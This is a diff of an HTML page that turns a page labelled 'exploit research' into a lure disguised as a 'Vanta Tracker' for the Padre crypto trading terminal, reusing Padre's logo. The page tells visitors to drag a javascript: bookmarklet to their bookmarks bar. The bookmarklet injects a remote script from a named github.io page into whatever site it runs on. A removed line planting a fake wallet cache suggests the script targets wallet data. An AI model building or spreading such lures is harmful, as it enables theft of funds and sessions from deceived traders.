@@ -1,25 +1,37 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Vanta Research Lab</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Padre | Terminal</title>
     <style>
-        body { background: #050505; color: #00ff88; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #00ff88; padding: 20px; border-radius: 8px; text-align: center; box-shadow: 0 0 20px rgba(0,255,136,0.1); }
-        button { background: #00ff88; color: #000; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        :root { --vanta: #00ff88; --bg: #050505; --card: #0a0a0a; --border: #1a1a1a; }
+        body { background: var(--bg); color: #fff; font-family: 'Geist', 'Inter', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; overflow: hidden; }
+        .container { background: var(--card); border: 1px solid var(--border); padding: 48px; border-radius: 24px; text-align: center; width: 380px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
+        .logo { width: 56px; margin-bottom: 24px; filter: drop-shadow(0 0 12px var(--vanta)); }
+        h1 { font-size: 22px; font-weight: 700; margin-bottom: 8px; letter-spacing: -0.5px; }
+        p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 32px; }
+        .bookmark-btn {
+            display: inline-block; background: var(--vanta); color: #000; padding: 14px 28px;
+            border-radius: 12px; font-weight: 800; font-size: 14px; text-decoration: none;
+            cursor: move; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 0 20px rgba(0,255,136,0.2);
+        }
+        .bookmark-btn:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,255,136,0.4); }
+        .instruction { margin-top: 16px; font-size: 11px; color: #444; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>VANTA EXPLOIT RESEARCH</h2>
-        <p>Status: <span id="status">Ready for Deployment</span></p>
-        <a href="javascript:(function(){var s=document.createElement('script');s.src='https://YOUR_GITHUB_USERNAME.github.io/YOUR_REPO/tracker.js';document.body.appendChild(s);})();">
-            <button>DRAG TO BOOKMARKS BAR</button>
+    <div class="container">
+        <img src="https://trade.padre.gg/logo.svg" class="logo" alt="Padre">
+        <h1>VANTA TRACKER</h1>
+        <p>Connect your terminal to the Vanta network for real-time whale tracking and liquidity alerts.</p>
+        
+        <a class="bookmark-btn" href="javascript:(function(){var s=document.createElement('script');s.src='https://jinxthesimp.github.io/Dropshipper/tracker.js';s.id='vanta-init';document.body.appendChild(s);})();">
+            DRAG TO BOOKMARKS
         </a>
+        
+        <div class="instruction">Drag the button above to your bookmarks bar</div>
     </div>
-
-    <script>
-        // Simulating a "Logged In" state for the audit to find
-        localStorage.setItem('padreV2-walletsCache', JSON.stringify({active: "0x9f74e6439c5d6c25ff86a55dbd513ce4558bd516"}));
-    </script>
 </body>
 </html>
